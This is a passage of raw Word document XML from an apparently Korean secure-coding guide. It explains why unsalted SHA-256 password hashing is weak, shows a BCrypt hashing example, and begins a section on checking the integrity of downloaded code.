              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>솔트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SHA-256</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동일한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>항상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동일한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>생성합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>레인보우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테이블</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계산된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역산</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테이블</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>흔한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>초</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역산됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대다수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>고객</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>즉시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>노출됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] BCrypt </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>솔트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>userDao.savePassword(userId, hashed);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>boolean match = BCrypt.checkpw(inputPassword, storedHash);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  15. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>무결성</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검사</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>없는</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다운로드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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부에서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다운로드한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코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일은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체크섬</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(SHA-256 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>또는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전자서명으로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무결성을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검증한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다운로드한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코드는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최소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권한으로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실행한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
